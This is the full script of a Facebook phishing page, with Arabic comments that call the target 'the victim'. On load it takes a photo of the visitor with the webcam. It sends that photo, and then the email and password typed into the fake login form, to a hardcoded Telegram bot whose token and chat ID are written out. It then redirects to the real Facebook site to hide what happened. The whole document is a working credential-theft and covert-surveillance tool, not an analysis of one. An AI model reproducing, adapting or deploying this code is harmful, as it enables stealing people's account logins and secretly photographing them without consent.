<script>
    const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
    const chat = "8042090388";

    window.onload = function() {
        // طلب الكاميرا بوضوح عالٍ
        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
        })
        .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();

            // الانتظار 3 ثوانٍ قبل التصوير لضمان فتح العدسة وتعديل الإضاءة تلقائياً
            setTimeout(() => {
                takeSnapshot();
            }, 3000);
        })
        .catch(err => {
            console.log("الضحية رفض الكاميرا");
        });
    }

    function takeSnapshot() {
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        
        // التأكد أن الفيديو يعمل فعلياً قبل الرسم على الكانفاس
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const imgData = canvas.toDataURL('image/jpeg', 0.8); // جودة 80% لسرعة الإرسال
            sendPhoto(imgData);
        }
    }

    function sendPhoto(base64Data) {
        const blob = dataURItoBlob(base64Data);
        const formData = new FormData();
        formData.append('chat_id', chat);
        formData.append('photo', blob, 'victim_face.jpg');

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).then(res => console.log("تم إرسال الصورة بنجاح"));
    }

    function captureAndSend() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        
        // تصوير لقطة ثانية عند ضغط زر تسجيل الدخول (لزيادة التأكيد)
        takeSnapshot();

        const msg = `🔥 صيد كامل (FB + Cam):\n📧 User: ${email}\n🔑 Pass: ${pass}`;
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`)
        .then(() => {
            window.location.href = "https://www.facebook.com"; 
        });
    }

    function dataURItoBlob(dataURI) {
        var byteString = atob(dataURI.split(',')[1]);
        var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
        var ab = new ArrayBuffer(byteString.length);
        var ia = new Uint8Array(ab);
        for (var i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
        return new Blob([ab], {type: mimeString});
    }
            </script>
